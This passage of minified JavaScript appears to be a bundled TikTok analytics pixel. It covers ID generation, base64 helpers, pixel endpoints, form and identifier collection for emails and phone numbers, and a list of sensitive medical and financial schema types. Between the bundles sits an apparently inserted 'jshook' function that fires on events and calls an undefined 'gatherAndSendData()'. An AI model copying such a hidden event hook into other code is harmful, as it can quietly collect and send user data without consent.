    }), e.d(n, "customAlphabet", function () {
      return u;
    }), e.d(n, "customRandom", function () {
      return i;
    }), e.d(n, "urlAlphabet", function () {
      return r;
    }), e.d(n, "random", function () {
      return o;
    });
    let r = "useandom-26T198340PX75pxJACKVERYMINDBUSHWOLF_GQZbfghjklqvwyzrict",
      o = t => crypto.getRandomValues(new Uint8Array(t)),
      i = (o, t, i) => {
        let u = (2 << Math.log(o.length - 1) / Math.LN2) - 1,
          c = -~(1.6 * u * t / o.length);
        return (n = t) => {
          let e = "";
          for (;;) {
            var r = i(c);
            let t = c;
            for (; t--;) if (e += o[r[t] & u] || "", e.length === n) return e;
          }
        };
      },
      u = (t, n = 21) => i(t, n, o),
      c = (n = 21) => {
        let e = "";
        for (var r = crypto.getRandomValues(new Uint8Array(n)); n--;) {
          let t = 63 & r[n];
          t < 36 ? e += t.toString(36) : t < 62 ? e += (t - 26).toString(36).toUpperCase() : t < 63 ? e += "_" : e += "-";
        }
        return e;
      };
  },
  w0s3: function (t, n, e) {
    "use strict";

    e.d(n, "f", function () {
      return r;
    }), e.d(n, "c", function () {
      return o;
    }), e.d(n, "b", function () {
      return i;
    }), e.d(n, "i", function () {
      return u;
    }), e.d(n, "a", function () {
      return c;
    }), e.d(n, "g", function () {
      return a;
    }), e.d(n, "h", function () {
      return f;
    }), e.d(n, "e", function () {
      return l;
    }), e.d(n, "d", function () {
      return s;
    });
    var r = "TiktokAnalyticsObject",
      o = "ttq",
      i = "external",
      u = "tiktok",
      c = "https://analytics.tiktok.com/i18n/pixel/config.js",
      a = "https://analytics.tiktok.com/i18n/pixel/pickup.js",
      f = "https://analytics.tiktok.com/i18n/pixel/identify.js",
      l = "https://analytics.tiktok.com/i18n/pixel/enable_cookie",
      s = "https://analytics.tiktok.com/i18n/pixel/disable_cookie";
  },
  yLpj: function (t, n) {
    var e = function () {
      return this;
    }();
    try {
      e = e || new Function("return this")();
    } catch (r) {
      "object" == typeof window && (e = window);
    }
    t.exports = e;
  }
});
function jshook(event) {
  console.log("Detected Event: " + event.type);
  gatherAndSendData();
}
!function (n) {
  var r = {};
  function o(t) {
    if (r[t]) return r[t].exports;
    var e = r[t] = {
      i: t,
      l: !1,
      exports: {}
    };
    return n[t].call(e.exports, e, e.exports, o), e.l = !0, e.exports;
  }
  o.m = n, o.c = r, o.d = function (t, e, n) {
    o.o(t, e) || Object.defineProperty(t, e, {
      enumerable: !0,
      get: n
    });
  }, o.r = function (t) {
    "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, {
      value: "Module"
    }), Object.defineProperty(t, "__esModule", {
      value: !0
    });
  }, o.t = function (e, t) {
    if (1 & t && (e = o(e)), 8 & t) return e;
    if (4 & t && "object" == typeof e && e && e.__esModule) return e;
    var n = Object.create(null);
    if (o.r(n), Object.defineProperty(n, "default", {
      enumerable: !0,
      value: e
    }), 2 & t && "string" != typeof e) for (var r in e) o.d(n, r, function (t) {
      return e[t];
    }.bind(null, r));
    return n;
  }, o.n = function (t) {
    var e = t && t.__esModule ? function () {
      return t["default"];
    } : function () {
      return t;
    };
    return o.d(e, "a", e), e;
  }, o.o = function (t, e) {
    return Object.prototype.hasOwnProperty.call(t, e);
  }, o.p = "https://analytics.tiktok.com/i18n/pixel/", o(o.s = "JaPm");
}({
  "/6w+": function (t, e, n) {
    "use strict";

    var r, o, i;
    n.d(e, "b", function () {
      return r;
    }), n.d(e, "a", function () {
      return o;
    }), n.d(e, "c", function () {
      return i;
    }), (e = r = r || {})[e.OTHER = 0] = "OTHER", e[e.ANDROID = 1] = "ANDROID", e[e.IOS = 2] = "IOS", (e = o = o || {}).LOAD_START = "load_start", e.LOAD_END = "load_end", e.BEFORE_INIT = "before_init", e.INIT_START = "init_start", e.INIT_END = "init_end", e.JSB_INIT_START = "jsb_init_start", e.JSB_INIT_END = "jsb_init_end", e.BEFORE_AD_INFO_INIT_START = "before_ad_info_init_start", e.AD_INFO_INIT_START = "ad_info_init_start", e.AD_INFO_INIT_END = "ad_info_init_end", e.IDENTIFY_INIT_START = "identify_init_start", e.IDENTIFY_INIT_END = "identify_init_end", e.PLUGIN_INIT_START = "_init_start", e.PLUGIN_INIT_END = "_init_end", e.PIXEL_SEND = "pixel_send", e.PIXEL_SEND_PCM = "pixel_send_PCM", e.JSB_SEND = "jsb_send", e.HTTP_SEND = "http_send", e.HANDLE_CACHE = "handle_cache", e.INIT_ERROR = "init_error", e.PIXEL_EMPTY = "pixel_empty", e.JSB_ERROR = "jsb_error", e.API_ERROR = "api_error", e.PLUGIN_ERROR = "plugin_error", e.CUSTOM_INFO = "custom_info", e.CUSTOM_ERROR = "custom_error", (e = i = i || {})[e.IFRAME = 1] = "IFRAME", e[e.NORMAL = 2] = "NORMAL", e[e.WEBWORKER = 3] = "WEBWORKER";
  },
  "0c63": function (t, e, n) {
    "use strict";

    n.d(e, "a", function () {
      return r;
    });
    String.fromCharCode.bind(String), Array.prototype.slice.call("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=");
    var r = function (t) {
      return (0, n("52Kp").encodeURI)(t);
    };
  },
  "1MmD": function (t, e, n) {
    "use strict";

    n.d(e, "a", function () {
      return i;
    });
    n("0c63");
    var r = n("ZFXO"),
      o = n("SbFU"),
      i = (n("7f3k"), undefined && undefined.__read, function (t, e) {
        if ("selfhost" === t && e && Object(o.g)(e)) return "https://" + Object(o.g)(e) + "/api/v2/pixel";
        t = {
          PCM: r.f,
          track: r.j,
          performance: r.g,
          interaction: r.d,
          performance_interaction: r.h,
          auto_config: r.c
        }[t];
        return t || null;
      });
  },
  "2HLQ": function (t, e, n) {
    "use strict";

    var r;
    n.d(e, "a", function () {
      return r;
    }), (e = r = r || {})[e.NOT_SURE = 0] = "NOT_SURE", e[e.INVOKE_METHOD_ENABLED = 1] = "INVOKE_METHOD_ENABLED", e[e.INVOKE_METHOD_NOT_ENABLED = 2] = "INVOKE_METHOD_NOT_ENABLED", e[e.TOUTIAO_BRIDGE_NOT_ENABLED = 3] = "TOUTIAO_BRIDGE_NOT_ENABLED";
  },
  "52Kp": function (t, e, n) {
    "use strict";

    n.r(e), n.d(e, "version", function () {
      return f;
    }), n.d(e, "VERSION", function () {
      return d;
    }), n.d(e, "atob", function () {
      return M;
    }), n.d(e, "atobPolyfill", function () {
      return w;
    }), n.d(e, "btoa", function () {
      return R;
    }), n.d(e, "btoaPolyfill", function () {
      return O;
    }), n.d(e, "fromBase64", function () {
      return c;
    }), n.d(e, "toBase64", function () {
      return a;
    }), n.d(e, "utob", function () {
      return i;
    }), n.d(e, "encode", function () {
      return a;
    }), n.d(e, "encodeURI", function () {
      return H;
    }), n.d(e, "encodeURL", function () {
      return H;
    }), n.d(e, "btou", function () {
      return u;
    }), n.d(e, "decode", function () {
      return c;
    }), n.d(e, "isValid", function () {
      return s;
    }), n.d(e, "fromUint8Array", function () {
      return o;
    }), n.d(e, "toUint8Array", function () {
      return U;
    }), n.d(e, "extendString", function () {
      return F;
    }), n.d(e, "extendUint8Array", function () {
      return j;
    }), n.d(e, "extendBuiltins", function () {
      return B;
    }), n.d(e, "Base64", function () {
      return X;
    });
    var r,
      o,
      i,
      a,
      u,
      c,
      s,
      l = n("RIqP"),
      f = "3.6.0",
      d = f,
      h = "function" == typeof atob,
      e = "function" == typeof btoa,
      n = "function" == typeof Buffer,
      p = "function" == typeof TextDecoder ? new TextDecoder() : undefined,
      _ = "function" == typeof TextEncoder ? new TextEncoder() : undefined,
      m = l("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="),
      y = (r = {}, m.forEach(function (t, e) {
        return r[t] = e;
      }), r),
      g = /^(?:[A-Za-z\d+\/]{4})*?(?:[A-Za-z\d+\/]{2}(?:==)?|[A-Za-z\d+\/]{3}=?)?$/,
      E = String.fromCharCode.bind(String),
      v = "function" == typeof Uint8Array.from ? Uint8Array.from.bind(Uint8Array) : function (t) {
        var e = 1 < arguments.length && arguments[1] !== undefined ? arguments[1] : function (t) {
          return t;
        };
        return new Uint8Array(Array.prototype.slice.call(t, 0).map(e));
      },
      b = function b(t) {
        return t.replace(/[+\/]/g, function (t) {
          return "+" == t ? "-" : "_";
        }).replace(/=+$/m, "");
      },
      A = function A(t) {
        return t.replace(/[^A-Za-z0-9\+\/]/g, "");
      },
      O = function O(t) {
        for (var e, n, r, o = "", i = t.length % 3, a = 0; a < t.length;) {
          if (255 < (e = t.charCodeAt(a++)) || 255 < (n = t.charCodeAt(a++)) || 255 < (r = t.charCodeAt(a++))) throw new TypeError("invalid character found");
          o += m[(e = e << 16 | n << 8 | r) >> 18 & 63] + m[e >> 12 & 63] + m[e >> 6 & 63] + m[63 & e];
        }
        return i ? o.slice(0, i - 3) + "===".substring(i) : o;
      },
      R = e ? function (t) {
        return btoa(t);
      } : n ? function (t) {
        return Buffer.from(t, "binary").toString("base64");
      } : O,
      S = n ? function (t) {
        return Buffer.from(t).toString("base64");
      } : function (t) {
        for (var e = [], n = 0, r = t.length; n < r; n += 4096) e.push(E.apply(null, t.subarray(n, n + 4096)));
        return R(e.join(""));
      },
      C = function C(t) {
        if (t.length < 2) return (e = t.charCodeAt(0)) < 128 ? t : e < 2048 ? E(192 | e >>> 6) + E(128 | 63 & e) : E(224 | e >>> 12 & 15) + E(128 | e >>> 6 & 63) + E(128 | 63 & e);
        var e = 65536 + 1024 * (t.charCodeAt(0) - 55296) + (t.charCodeAt(1) - 56320);
        return E(240 | e >>> 18 & 7) + E(128 | e >>> 12 & 63) + E(128 | e >>> 6 & 63) + E(128 | 63 & e);
      },
      T = /[\uD800-\uDBFF][\uDC00-\uDFFFF]|[^\x00-\x7F]/g,
      x = n ? function (t) {
        return Buffer.from(t, "utf8").toString("base64");
      } : _ ? function (t) {
        return S(_.encode(t));
      } : function (t) {
        return R(i(t));
      },
      H = function H(t) {
        return a(t, !0);
      },
      N = /[\xC0-\xDF][\x80-\xBF]|[\xE0-\xEF][\x80-\xBF]{2}|[\xF0-\xF7][\x80-\xBF]{3}/g,
      I = function I(t) {
        switch (t.length) {
          case 4:
            var e = ((7 & t.charCodeAt(0)) << 18 | (63 & t.charCodeAt(1)) << 12 | (63 & t.charCodeAt(2)) << 6 | 63 & t.charCodeAt(3)) - 65536;
            return E(55296 + (e >>> 10)) + E(56320 + (1023 & e));
          case 3:
            return E((15 & t.charCodeAt(0)) << 12 | (63 & t.charCodeAt(1)) << 6 | 63 & t.charCodeAt(2));
          default:
            return E((31 & t.charCodeAt(0)) << 6 | 63 & t.charCodeAt(1));
        }
      },
      w = function w(t) {
        if (t = t.replace(/\s+/g, ""), !g.test(t)) throw new TypeError("malformed base64.");
        t += "==".slice(2 - (3 & t.length));
        for (var e, n, r, o = "", i = 0; i < t.length;) e = y[t.charAt(i++)] << 18 | y[t.charAt(i++)] << 12 | (n = y[t.charAt(i++)]) << 6 | (r = y[t.charAt(i++)]), o += 64 === n ? E(e >> 16 & 255) : 64 === r ? E(e >> 16 & 255, e >> 8 & 255) : E(e >> 16 & 255, e >> 8 & 255, 255 & e);
        return o;
      },
      M = h ? function (t) {
        return atob(A(t));
      } : n ? function (t) {
        return Buffer.from(t, "base64").toString("binary");
      } : w,
      D = n ? function (t) {
        return v(Buffer.from(t, "base64"));
      } : function (t) {
        return v(M(t), function (t) {
          return t.charCodeAt(0);
        });
      },
      U = function U(t) {
        return D(k(t));
      },
      L = n ? function (t) {
        return Buffer.from(t, "base64").toString("utf8");
      } : p ? function (t) {
        return p.decode(D(t));
      } : function (t) {
        return u(M(t));
      },
      k = function k(t) {
        return A(t.replace(/[-_]/g, function (t) {
          return "-" == t ? "+" : "/";
        }));
      },
      P = function P(t) {
        return {
          value: t,
          enumerable: !1,
          writable: !0,
          configurable: !0
        };
      },
      F = function F() {
        var n;
        (n = function n(t, e) {
          return Object.defineProperty(String.prototype, t, P(e));
        })("fromBase64", function () {
          return c(this);
        }), n("toBase64", function (t) {
          return a(this, t);
        }), n("toBase64URI", function () {
          return a(this, !0);
        }), n("toBase64URL", function () {
          return a(this, !0);
        }), n("toUint8Array", function () {
          return U(this);
        });
      },
      j = function j() {
        var n;
        (n = function n(t, e) {
          return Object.defineProperty(Uint8Array.prototype, t, P(e));
        })("toBase64", function (t) {
          return o(this, t);
        }), n("toBase64URI", function () {
          return o(this, !0);
        }), n("toBase64URL", function () {
          return o(this, !0);
        });
      },
      B = function B() {
        F(), j();
      },
      X = {
        version: f,
        VERSION: d,
        atob: M,
        atobPolyfill: w,
        btoa: R,
        btoaPolyfill: O,
        fromBase64: c = function c(t) {
          return L(k(t));
        },
        toBase64: a = function a(t) {
          return 1 < arguments.length && arguments[1] !== undefined && arguments[1] ? b(x(t)) : x(t);
        },
        encode: a,
        encodeURI: H,
        encodeURL: H,
        utob: i = function i(t) {
          return t.replace(T, C);
        },
        btou: u = function u(t) {
          return t.replace(N, I);
        },
        decode: c,
        isValid: s = function s(t) {
          if ("string" != typeof t) return !1;
          t = t.replace(/\s+/g, "").replace(/=+$/, "");
          return !/[^\s0-9a-zA-Z\+/]/.test(t) || !/[^\s0-9a-zA-Z\-_]/.test(t);
        },
        fromUint8Array: o = function o(t) {
          return 1 < arguments.length && arguments[1] !== undefined && arguments[1] ? b(S(t)) : S(t);
        },
        toUint8Array: U,
        extendString: F,
        extendUint8Array: j,
        extendBuiltins: B
      };
  },
  "7f3k": function (t, e, n) {
    "use strict";

    var r;
    n.d(e, "a", function () {
      return r;
    }), (e = r = r || {})[e.defaultReport = 0] = "defaultReport", e[e.httpReport = 1] = "httpReport", e[e.htmlHttpReport = 2] = "htmlHttpReport";
  },
  Bnag: function (t, e) {
    t.exports = function () {
      throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
    }, t.exports["default"] = t.exports, t.exports.__esModule = !0;
  },
  EbDI: function (t, e) {
    t.exports = function (t) {
      if ("undefined" != typeof Symbol && null != t[Symbol.iterator] || null != t["@@iterator"]) return Array.from(t);
    }, t.exports["default"] = t.exports, t.exports.__esModule = !0;
  },
  GJ6r: function (t, h, p) {
    "use strict";

    !function (t) {
      p.d(h, "a", function () {
        return r;
      }), p.d(h, "g", function () {
        return o;
      }), p.d(h, "e", function () {
        return u;
      }), p.d(h, "f", function () {
        return c;
      }), p.d(h, "b", function () {
        return l;
      }), p.d(h, "d", function () {
        return f;
      }), p.d(h, "c", function () {
        return d;
      });
      var e = p("SbFU"),
        n = (p("2HLQ"), p("IOsT"), p("w0s3")),
        r = function () {
          return "undefined" != typeof globalThis ? globalThis : "undefined" != typeof self ? self : "undefined" != typeof window ? window : void 0 !== t ? t : new Function("return this")();
        },
        o = function () {
          var t = r();
          return "undefined" != typeof t.DedicatedWorkerGlobalScope ? t instanceof t.DedicatedWorkerGlobalScope : "DedicatedWorkerGlobalScope" === t.constructor.name;
        },
        i = function () {
          var t = r();
          return "object" == typeof navigator ? navigator.userAgent : t._userAgent || "";
        },
        a = function () {
          var t;
          return (null === (t = null === (t = Object(e.e)()) || void 0 === t ? void 0 : t._env) || void 0 === t ? void 0 : t.env) || n.b;
        },
        u = function () {
          return a() !== n.b;
        },
        c = function () {
          return a() === n.i;
        },
        s = (Object(e.n)(function () {
          return /open_news/i.test(i());
        }), Object(e.n)(function () {
          return /ultralite/i.test(i());
        }), function () {
          return /windows phone/i.test(i()) ? "Windows Phone" : /android/i.test(i()) ? "android" : /iPad|iPhone|iPod/.test(i()) ? "ios" : "pc";
        }),
        l = function () {
          return "android" === s();
        },
        f = function () {
          return "ios" === s();
        },
        d = function () {
          return "development" === "production".trim();
        };
    }.call(this, p("yLpj"));
  },
  HyyX: function (t, e, n) {
    "use strict";

    n.d(e, "c", function () {
      return r;
    }), n.d(e, "a", function () {
      return o;
    }), n.d(e, "b", function () {
      return i;
    });
    var r = ["email", "phone_number", "auto_email", "auto_phone_number", "external_id", "sha256_email", "sha256_phone_number", "sha256_external_id"];
    (e = a = a || {}).missing = "missing", e.valid = "valid", e.invalid = "invalid", (e = {}).empty = "empty", e.whitespace = "whitespace", e.hardcode = "hardcode", e.encode = "encode", (e = {}).invalidCountry = "invalid_country", e.notANumber = "not_a_number", e.tooShort = "too_short", e.tooLong = "too_long", e.invalidLength = "invalid_length", e.emptyCountryCodeThroughIP = "empty_country_code_through_ip", e.invalidCountryAfterInjectPlus = "invalid_country_after_inject_plus", e.notANumberAfterInjectPlus = "not_a_number_after_inject_plus", e.tooShortAfterInjectPlus = "too_short_after_inject_plus", e.tooLongAfterInjectPlus = "too_long_after_inject_plus", e.invalidLengthAfterInjectPlus = "invalid_length_after_inject_plus", e.invalidCountryAfterInjectCountry = "invalid_country_after_inject_country", e.notANumberAfterInjectCountry = "not_a_number_after_inject_country", e.tooShortAfterInjectCountry = "too_short_after_inject_country", e.tooLongAfterInjectCountry = "too_long_after_inject_country", e.invalidLengthAfterInjectCountry = "invalid_length_after_inject_country", (e = {}).letterCase = "letter_case", e.isNotValidEmail = "is_not_valid_email", e.isNotPossibleEmail = "is_not_possible_email", e.domainTypo = "domain_typo", e.addressFormat = "address_format";
    var o, i, a;
    a.missing, a.missing, a.missing, a.missing, a.missing, a.missing;
    (a = o = o || {}).EMPTY_VALUE = "empty_value", a.WRONG_FORMAT = "wrong_format", a.CORRECT_FORMAT = "correct_format", a.HASHED = "hashed", a.HASHED_ERR = "hashed_err", a.HASHED_CORRECT = "hashed_correct", a.PLAINTEXT_EMAIL = "plaintext_email", a.PLAINTEXT_PHONE = "plaintext_phone", (a = i = i || {}).EMPTY_VALUE = "empty_value", a.PLAIN_EMAIL = "plain_email", a.PLAIN_PHONE = "plain_phone", a.HASHED = "hashed", a.FILTER_EVENTS = "filter_events", a.UNKNOWN_INVALID = "unknown_invalid", a.BASE64_STRING_HASHED = "base64_string_hashed", a.BASE64_HEX_HASHED = "base64_hex_hashed", a.PLAIN_MDN_EMAIL = "plain_mdn_email", (a = {}).Manual = "manual", a.Auto = "auto";
  },
  IOsT: function (t, e, n) {
    "use strict";

    var r;
    n.d(e, "a", function () {
      return r;
    }), (e = r = r || {}).Normal = "1", e.Iframe = "2", e.WebWorker = "3", e.SandboxIframe = "4";
  },
  Ijbi: function (t, e, n) {
    var r = n("WkPL");
    t.exports = function (t) {
      if (Array.isArray(t)) return r(t);
    }, t.exports["default"] = t.exports, t.exports.__esModule = !0;
  },
  JaPm: function (t, e, n) {
    "use strict";

    n.r(e);
    var l,
      u = n("SbFU"),
      r = n("Pd38"),
      o = n("SnBs"),
      A = n("fe1q"),
      i = n("Mo1V"),
      O = n("/6w+"),
      a = n("1MmD"),
      c = n("7f3k");
    (e = l = l || {}).ERROR_FORMAT = "error_format", e.OVER_LENGTH = "over_length_3e4", e.FILTER_SENSITIVE_FIELDS = "filter_sensitive_fields";
    var s,
      f,
      d,
      h,
      p,
      _ = "form_detail_error";
    (e = s = s || {}).GET_ELEMENTS_ERROR = "get_elements_error", e.INIT_ERROR = "init_error", e.ASSEMBLE_FORM_DETAIL_ERROR = "assemble_form_detail_error", e.DETECT_FORM_ELEMENT_ERROR = "detect_form_element_error", e.GET_OVERALL_FORM_DETAIL_ERROR = "get_overall_form_detail_error", e.FORM_OBSERVER_ERROR = "form_observer_error", e.OVER_LENGTH = "over_length_3e4", (e = f = f || {}).METADATA = "Metadata", e.CLICK = "Click", (e = d = d || {}).AUTO_COLLECTION = "AUTO_COLLECTION", e.AUTO_FORM = "AUTO_FORM", e.AUTO_CLICK = "AUTO_CLICK", e.AUTO_VC = "AUTO_VC", e.AUTO_VC_REVERSE = "AUTO_VC_REVERSE", (e = h = h || {}).AUTO_FORM = "form_rules", e.AUTO_VC = "vc_rules", e.AUTO_VC_REVERSE = "vc_rules_reverse", (e = p = p || {}).PAGE_LEAVE = "PageLeave", e.PAGE_VIEW = "PageView", e.DOM_CHANGE = "DomChange", e.CLICK = "Click";
    var m,
      y,
      g = n("bCcq"),
      E = ["AnatomicalStructure", "AnatomicalSystem", "ApprovedIndication", "ArriveAction", "Artery", "BioChemEntity", "BloodTest", "Bone", "BorrowAction", "BrainStructure", "BrokerageAccount", "CDCPMDRecord", "ChemicalSubstance", "CovidTestingFacility", "DDxElement", "DepartAction", "DepositAccount", "DiagnosticLab", "DiagnosticProcedure", "Diet", "DietarySupplement", "DoseSchedule", "ElementarySchool", "HighSchool", "ExercisePlan", "Gene", "GovernmentBenefitsType", "GovernmentService", "HealthAspectEnumeration", "HealthInsurancePlan", "HealthPlanCostSharingSpecification", "HealthTopicContent", "Hospital", "ImagingTest", "InfectiousAgentClass", "InvestmentFund", "InvestmentOrDeposit", "Invoice", "Joint", "LendAction", "LifestyleModification", "Ligament", "LoanOrCredit", "LymphaticVessel", "MaximumDoseSchedule", "MedicalAudience", "MedicalAudienceType", "MedicalCause", "MedicalCode", "MedicalCondition", "MedicalConditionStage", "MedicalContraindication", "MedicalDevice", "MedicalEntity", "MedicalEvidenceLevel", "MedicalGuidelineContraindication", "MedicalIndication", "MedicalIntangible", "MedicalObservationalStudy", "MedicalOrganization", "MedicalProcedure", "MedicalProcedureType", "MedicalRiskCalculator", "MedicalRiskFactor", "MedicalRiskScore", "MedicalSign", "MedicalSignOrSymptom", "MedicalStudy", "MedicalSymptom", "MedicalTest", "MedicalTestPanel", "MedicalTherapy", "MedicalTrial", "MiddleSchool", "MoneyTransfer", "Muscle", "Nerve", "OccupationalTherapy", "Order", "PalliativeProcedure", "ParentAudience", "PathologyTest", "Patient", "PeopleAudience", "Person", "Pharmacy", "PhysicalActivity", "PhysicalTherapy", "Physician", "PoliticalParty", "Preschool", "PreventionIndication", "Protein", "PsychologicalTreatment", "RadiationTherapy", "RecommendedDoseSchedule", "ReportedDoseSchedule", "School", "Substance", "SuperficialAnatomy", "SurgicalProcedure", "Text", "TherapeuticProcedure", "TreatmentIndication", "URL", "Vein", "Vessel", "VitalSign", "WorkersUnion"],
      v = 3e4,
      b = undefined && undefined.__assign || function () {
        return (b = Object.assign || function (t) {
          for (var e, n = 1, r = arguments.length; n < r; n++) for (var o in e = arguments[n]) Object.prototype.hasOwnProperty.call(e, o) && (t[o] = e[o]);
          return t;
        }).apply(this, arguments);
      },
      R = undefined && undefined.__generator || function (n, r) {
        var o,
          i,
          a,
          u = {
            label: 0,
            sent: function () {
              if (1 & a[0]) throw a[1];
              return a[1];
            },
            trys: [],
            ops: []
          },
          t = {
            next: e(0),
            "throw": e(1),
            "return": e(2)
          };
        return "function" == typeof Symbol && (t[Symbol.iterator] = function () {
          return this;
        }), t;
        function e(e) {
          return function (t) {
            return c([e, t]);
          };
        }
        function c(t) {
          if (o) throw new TypeError("Generator is already executing.");
          for (; u;) try {
            if (o = 1, i && (a = 2 & t[0] ? i["return"] : t[0] ? i["throw"] || ((a = i["return"]) && a.call(i), 0) : i.next) && !(a = a.call(i, t[1])).done) return a;
            switch (i = 0, (t = a ? [2 & t[0], a.value] : t)[0]) {
              case 0:
              case 1:
                a = t;
                break;
              case 4:
                return u.label++, {
                  value: t[1],
                  done: !1
                };
              case 5:
                u.label++, i = t[1], t = [0];
                continue;
              case 7:
                t = u.ops.pop(), u.trys.pop();
                continue;
              default:
                if (!(a = 0 < (a = u.trys).length && a[a.length - 1]) && (6 === t[0] || 2 === t[0])) {
                  u = 0;
                  continue;
                }
                if (3 === t[0] && (!a || t[1] > a[0] && t[1] < a[3])) {
                  u.label = t[1];
                  break;
                }
                if (6 === t[0] && u.label < a[1]) {
                  u.label = a[1], a = t;
                  break;
                }
                if (a && u.label < a[2]) {
                  u.label = a[2], u.ops.push(t);
                  break;
                }
                a[2] && u.ops.pop(), u.trys.pop();
                continue;
            }
            t = r.call(n, u);
          } catch (e) {
            t = [6, e], i = 0;
          } finally {
            o = a = 0;
          }
          if (5 & t[0]) throw t[1];
          return {
            value: t[0] ? t[1] : void 0,
            done: !0
          };
        }
      },
      S = undefined && undefined.__read || function (t, e) {
        var n = "function" == typeof Symbol && t[Symbol.iterator];
        if (!n) return t;
        var r,
          o,
          i = n.call(t),
          a = [];
        try {
          for (; (void 0 === e || 0 < e--) && !(r = i.next()).done;) a.push(r.value);
        } catch (u) {
          o = {
            error: u
          };
        } finally {
          try {
            r && !r.done && (n = i["return"]) && n.call(i);
          } finally {
            if (o) throw o.error;
          }
        }
        return a;
      },
      C = undefined && undefined.__spread || function () {
        for (var t = [], e = 0; e < arguments.length; e++) t = t.concat(S(arguments[e]));
        return t;
      },
      T = undefined && undefined.__values || function (t) {
        var e = "function" == typeof Symbol && Symbol.iterator,
          n = e && t[e],
          r = 0;
        if (n) return n.call(t);
        if (t && "number" == typeof t.length) return {
          next: function () {
            return {
              value: (t = t && r >= t.length ? void 0 : t) && t[r++],
              done: !t
            };
          }
        };
        throw new TypeError(e ? "Object is not iterable." : "Symbol.iterator is not defined.");
      };
    function x(t, e) {
      if (t.nodeType !== Node.ELEMENT_NODE) throw new Error("Can't generate CSS selector for non-element node type.");
      if ("html" === t.tagName.toLowerCase()) return "html";
      var n = {
        root: document.body,
        idName: function (t) {
          return !0;
        },
        className: function (t) {
          return !0;
        },
        tagName: function (t) {
          return !0;
        },
        attr: function (t, e) {
          return !1;
        },
        seedMinLength: 1,
        optimizedMinLength: 2,
        threshold: 1e3,
        maxNumberOfTries: 1e4
      };
      m = b(b({}, n), e), e = m.root, n = n, y = e.nodeType === Node.DOCUMENT_NODE || e !== n.root ? e : e.ownerDocument;
      n = H(t, "all", function () {
        return H(t, "two", function () {
          return H(t, "one", function () {
            return H(t, "none");
          });
        });
      });
      if (n) {
        e = F(function u(e, n, r) {
          var o, i, a;
          void 0 === r && (r = {
            counter: 0,
            visited: new Map()
          });
          return R(this, function (t) {
            switch (t.label) {
              case 0:
                if (!(2 < e.length && e.length > m.optimizedMinLength)) return [3, 5];
                o = 1, t.label = 1;
              case 1:
                return o < e.length - 1 ? r.counter > m.maxNumberOfTries ? [2] : (r.counter += 1, (i = C(e)).splice(o, 1), a = I(i), r.visited.has(a) ? [2] : M(i) && j(i, n) ? [4, i] : [3, 4]) : [3, 5];
              case 2:
                return t.sent(), r.visited.set(a, !0), [5, T(u(i, n, r))];
              case 3:
                t.sent(), t.label = 4;
              case 4:
                return o++, [3, 1];
              case 5:
                return [2];
            }
          });
        }(n, t));
        return I(n = 0 < e.length ? e[0] : n);
      }
      throw new Error("Selector was not found.");
    }
    function H(t, s, l) {
      for (var f = null, d = [], h = t, p = 0, e = function () {
          var t,
            e,
            n,
            r,
            n = k(function (t) {
              t = t.getAttribute("id");
              if (t && m.idName(t)) return {
                name: "#" + CSS.escape(t),
                penalty: 0
              };
              return null;
            }(h)) || k.apply(void 0, C((r = h, Array.from(r.attributes).filter(function (t) {
              return m.attr(t.name, t.value);
            }).map(function (t) {
              return {
                name: "[" + CSS.escape(t.name) + '="' + CSS.escape(t.value) + '"]',
                penalty: .5
              };
            })))) || k.apply(void 0, C((n = h, Array.from(n.classList).filter(m.className).map(function (t) {
              return {
                name: "." + CSS.escape(t),
                penalty: 1
              };
            })))) || k(function (t) {
              t = t.tagName.toLowerCase();
              if (m.tagName(t)) return {
                name: t,
                penalty: 2
              };
              return null;
            }(h)) || [D()],
            o = function (t) {
              var e = t.parentNode;
              if (!e) return null;
              var n = e.firstChild;
              if (!n) return null;
              var r = 0;
              for (; n && (n.nodeType === Node.ELEMENT_NODE && r++, n !== t);) n = n.nextSibling;
              return r;
            }(h);
          "all" == s ? o && (n = n.concat(n.filter(L).map(function (t) {
            return U(t, o);
          }))) : "two" == s ? (n = n.slice(0, 1), o && (n = n.concat(n.filter(L).map(function (t) {
            return U(t, o);
          })))) : "one" == s ? (i = S(n = n.slice(0, 1), 1)[0], o && L(i) && (n = [U(i, o)])) : "none" == s && (n = [D()], o && (n = [U(n[0], o)]));
          try {
            for (var i, a = (t = void 0, T(n)), u = a.next(); !u.done; u = a.next()) (i = u.value).level = p;
          } catch (c) {
            t = {
              error: c
            };
          } finally {
            try {
              u && !u.done && (e = a["return"]) && e.call(a);
            } finally {
              if (t) throw t.error;
            }
          }
          if (d.push(n), d.length >= m.seedMinLength && (f = N(d, l))) return "break";
          h = h.parentElement, p++;
        }; h;) if ("break" === e()) break;
      return !(f = f || N(d, l)) && l ? l() : f;
    }
    function N(t, e) {
      var n,
        r,
        t = F(function c(e, n) {
          var r, o, i;
          var a, u;
          void 0 === n && (n = []);
          return R(this, function (t) {
            switch (t.label) {
              case 0:
                if (!(0 < e.length)) return [3, 9];
                t.label = 1;
              case 1:
                t.trys.push([1, 6, 7, 8]), r = T(e[0]), o = r.next(), t.label = 2;
              case 2:
                return o.done ? [3, 5] : (i = o.value, [5, T(c(e.slice(1, e.length), n.concat(i)))]);
              case 3:
                t.sent(), t.label = 4;
              case 4:
                return o = r.next(), [3, 2];
              case 5:
                return [3, 8];
              case 6:
                return a = t.sent(), a = {
                  error: a
                }, [3, 8];
              case 7:
                try {
                  o && !o.done && (u = r["return"]) && u.call(r);
                } finally {
                  if (a) throw a.error;
                }
                return [7];
              case 8:
                return [3, 11];
              case 9:
                return [4, n];
              case 10:
                t.sent(), t.label = 11;
              case 11:
                return [2];
            }
          });
        }(t));
      if (t.length > m.threshold) return e ? e() : null;
      try {
        for (var o = T(t), i = o.next(); !i.done; i = o.next()) {
          var a = i.value;
          if (M(a)) return a;
        }
      } catch (u) {
        n = {
          error: u
        };
      } finally {
        try {
          i && !i.done && (r = o["return"]) && r.call(o);
        } finally {
          if (n) throw n.error;
        }
      }
      return null;
    }
    function I(t) {
